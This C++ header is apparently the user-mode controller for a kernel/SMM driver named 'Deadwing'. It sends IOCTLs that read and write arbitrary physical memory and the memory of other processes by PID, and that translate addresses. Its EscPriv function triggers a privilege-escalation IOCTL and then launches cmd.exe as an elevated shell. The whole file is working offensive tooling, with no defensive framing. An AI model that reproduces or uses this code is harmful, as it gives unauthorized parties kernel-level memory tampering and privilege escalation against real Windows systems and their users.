#include <Windows.h>
#include <iostream>

#define IOCTL_DEADWING_PING_SMI        CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD000, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_CACHE_SESSION   CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD002, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_READ_PHYS       CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD003, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_READ_VIRTUAL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD004, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_WRITE_PHYS      CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD005, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_WRITE_VIRTUAL   CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD006, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_VIRT_TO_PHYS    CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD008, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_PRIV_ESC        CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD00A, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _DEADWING_UM_KM_COMMUNICATION {
	UINT64 ProcessId;

	struct {
		PVOID  PhysReadAddress;
		PVOID  VaReadAddress;
		PVOID  VaReadResultAddress;
		UINT64 ReadLength;
	} Read;

	struct {
		PVOID  PhysWriteAddress;
		PVOID  VaWriteAddress;
		PVOID  VaDataAddress;
		UINT64 WriteLength;
	} Write;

	struct {
		PVOID  AddressToTranslate;
		UINT64 Translated;
	} Vtop;
} DEADWING_UM_KM_COMMUNICATION, *PDEADWING_UM_KM_COMMUNICATION;


namespace Deadwing {
	class Commands {
		public:
			/**
			 * \brief Initializes session to work on
			 * 
			 * \param DeviceName Device name of KM driver
			 * 
			 * \returns true if handle obtained and session cached, otherwise false
			 */
			bool 
			WINAPI
			InitializeSession(
				_In_ const wchar_t *DeviceName
			) { 
				// open device
				HANDLE hDriver = CreateFileW(DeviceName, (FILE_READ_ACCESS | FILE_WRITE_ACCESS), (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, OPEN_EXISTING, 0, NULL);
				if(hDriver == INVALID_HANDLE_VALUE)
					return false;
				
				// cache session
				DWORD Pid = GetCurrentProcessId();
				DEADWING_UM_KM_COMMUNICATION Packet;
				Packet.ProcessId = Pid;

				DWORD Ret = 0;
				if(!DeviceIoControl(hDriver, IOCTL_DEADWING_CACHE_SESSION, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
					CloseHandle(hDriver);
					return false;
				}

				__hDriver = hDriver;

				return true;
			}

			/**
			 * \brief Pings SMM driver
			 * 
			 * \returns true if driver alive, otherwise false
			 */
			bool
			WINAPI
			Ping(
				void
			) {
				DWORD Ret = 0;
				DEADWING_UM_KM_COMMUNICATION Dummy = { 0 };

				// send ping packet to the driver
				if(!DeviceIoControl(__hDriver, IOCTL_DEADWING_PING_SMI, &Dummy, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL))
					return false;

				return true;
			}

			/**
			 * \brief Reads from target physical address
			 * 
			 * \param Address      Target physical address
			 * \param LengthToRead Length to read
			 * 
			 * \returns Pointer on buffer with specific data
			 */
			PVOID
			WINAPI
			PhysRead(
				_In_ const UINT64 Address,
				_In_ const UINT64 LengthToRead
			) {
				// setup packet for the KM driver
				// 1. validate user input
				// 2. allocate buffer for the result
				// 3. fill the packet
				// 4. send it to the driver
				if((Address == 0 || (LengthToRead > 0x1000 || LengthToRead == 0)))
					return nullptr;

				PVOID Buf = VirtualAlloc(NULL, LengthToRead, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
				if(Buf == nullptr)
					return nullptr;

				std::memset(Buf, 0, LengthToRead);

				DEADWING_UM_KM_COMMUNICATION Packet;
				Packet.Read.PhysReadAddress = (PVOID)Address;
				Packet.Read.VaReadResultAddress = (PVOID)Buf;
				Packet.Read.ReadLength = LengthToRead;

				DWORD Ret = 0;
				if(!DeviceIoControl(__hDriver, IOCTL_DEADWING_READ_PHYS, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
					VirtualFree(Buf, 0, MEM_RELEASE);
					return nullptr;
				}

				return Buf;
			}

			/**
			 * \brief Reads from target virtual address
			 * 
			 * \param Address      Target virtual address
			 * \param LengthToRead Length to read
			 * \param ProcessId    PID of target process
			 * 
			 * \returns Pointer to buffer with specific data
			 */
			PVOID
			WINAPI
			VaRead(
				_In_ const UINT64 Address,
				_In_ const UINT64 LengthToRead,
				_In_ const UINT64 ProcessId
			) {
				// setup packet for the KM driver
				// 1. validate user input
				// 2. allocate buffer for the result
				// 3. fill the packet
				// 4. send it to the driver
				if((Address == 0 || ProcessId == 0 || (LengthToRead > 0x1000 || LengthToRead == 0)))
					return nullptr;
				

				PVOID Buf = VirtualAlloc(nullptr, LengthToRead, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
				if(Buf == nullptr)
					return nullptr;

				std::memset(Buf, 0, LengthToRead);

				DEADWING_UM_KM_COMMUNICATION Packet;
				Packet.ProcessId = ProcessId;
				Packet.Read.VaReadAddress = (PVOID)Address;
				Packet.Read.VaReadResultAddress = (PVOID)Buf;
				Packet.Read.ReadLength = LengthToRead;

				DWORD Ret = 0;
				if(!DeviceIoControl(__hDriver, IOCTL_DEADWING_READ_VIRTUAL, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
					VirtualFree(Buf, 0, MEM_RELEASE);
					return nullptr;
				}

				return Buf;
			}

			/**
			 * \brief Writes data to the target physical address
			 * 
			 * \param Address        Target physical address
			 * \param LengthToWrite  Length to write
			 * \param Data           Data to write
			 * 
			 * \returns true if data has been written to the target address, otherwise false
			 */
			bool
			WINAPI
			PhysWrite(
				_In_ const UINT64 Address,
				_In_ const UINT64 LengthToWrite,
				_In_ const PVOID  Data
			) {
				// setup packet for the KM driver
				// 1. validate user input
				// 2. allocate buffer for the data which will be written and copy data to the buffer
				// 3. fill the packet
				// 4. send it to the driver
				if(!Data || Address == 0 || (LengthToWrite > 0x1000 || LengthToWrite == 0))
					return false;

				PVOID Buf = VirtualAlloc(nullptr, LengthToWrite, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
				if(Buf == nullptr)
					return false;

				std::memcpy(Buf, Data, LengthToWrite);

				DEADWING_UM_KM_COMMUNICATION Packet;
				Packet.Write.PhysWriteAddress = (PVOID)Address;
				Packet.Write.VaDataAddress = (PVOID)Buf;
				Packet.Write.WriteLength = LengthToWrite;

				DWORD Ret = 0;
				if(!DeviceIoControl(__hDriver, IOCTL_DEADWING_WRITE_PHYS, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
					VirtualFree(Buf, 0, MEM_RELEASE);
					return false;
				}

				VirtualFree(Buf, 0, MEM_RELEASE);
			
				return true;
			}

			/**
			 * \brief Writes to the target virtual address
			 * 
			 * \param Address        Target VA
			 * \param LengthToWrite  Length to write
			 * \param ProcessId      PID of target process
			 * \param Data           Data to write
			 * 
			 * \returns true if data has been written to the target address, otherwise false
			 */
			bool
			WINAPI
			VaWrite(
				_In_ const UINT64 Address,
				_In_ const UINT64 LengthToWrite,
				_In_ const UINT64 ProcessId,
				_In_ const PVOID  Data
			) {
				// setup packet for the KM driver
				// 1. validate user input
				// 2. allocate buffer for the data which will be written and copy data to the buffer
				// 3. fill the packet
				// 4. send it to the driver
				if(!Data || Address == 0 || ProcessId == 0 || (LengthToWrite > 0x1000 || LengthToWrite == 0))
					return false;

				PVOID Buf = VirtualAlloc(nullptr, LengthToWrite, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
				if(Buf == nullptr)
					return false;

				std::memcpy(Buf, Data, LengthToWrite);

				DEADWING_UM_KM_COMMUNICATION Packet;
				Packet.ProcessId = ProcessId;
				Packet.Write.VaWriteAddress = (PVOID)Address;
				Packet.Write.VaDataAddress = (PVOID)Buf;
				Packet.Write.WriteLength = LengthToWrite;

				DWORD Ret = 0;
				if(!DeviceIoControl(__hDriver, IOCTL_DEADWING_WRITE_VIRTUAL, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
					VirtualFree(Buf, 0, MEM_RELEASE);
					return false;
				}

				VirtualFree(Buf, 0, MEM_RELEASE);
			
				return true;
			}

			/**
			 * \brief Translates virtual address to physical
			 * 
			 * \param Address   Address to translate
			 * \param ProcessId PID of target process
			 * 
			 * \returns Physical address, otherwise zero
			 */
			UINT64
			WINAPI
			Vtop(
				_In_ const UINT64 Address,
				_In_ const UINT64 ProcessId
			) {
				// setup packet for the KM driver
				// 1. validate user input
				// 2. fill the packet
				// 3. send it to the driver
				if(ProcessId == 0 || Address == 0) 
					return 0;

				DEADWING_UM_KM_COMMUNICATION Output = { 0 };
				DEADWING_UM_KM_COMMUNICATION Packet = { 0 };
				Packet.ProcessId = ProcessId;
				Packet.Vtop.AddressToTranslate = (PVOID)Address;
				Packet.Vtop.Translated = 0;

				DWORD Ret = 0;
				if(!DeviceIoControl(__hDriver, IOCTL_DEADWING_VIRT_TO_PHYS, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), &Output, sizeof(DEADWING_UM_KM_COMMUNICATION), &Ret, NULL))
					return 0;

				return Output.Vtop.Translated;
			}

			/**
			 * \brief Leveraging privileges for the controller process
			 *
			 * \returns false if cannot spawn shell or reach KM driver
			 */
			bool
			WINAPI
			EscPriv(
				void
			) {
				// send priv esc packet ot the driver
				DWORD Ret = 0;
				DEADWING_UM_KM_COMMUNICATION Dummy = { 0 };
				if(!DeviceIoControl(__hDriver, IOCTL_DEADWING_PRIV_ESC, &Dummy, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL))
					return false;

				PROCESS_INFORMATION Pi = { 0 };
				STARTUPINFOW Si = { 0 };
				Si.cb = sizeof(STARTUPINFOW);

				if(!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &Si, &Pi))
					return false;

				return true;
			}
		private:
			HANDLE __hDriver = { };
	};
};
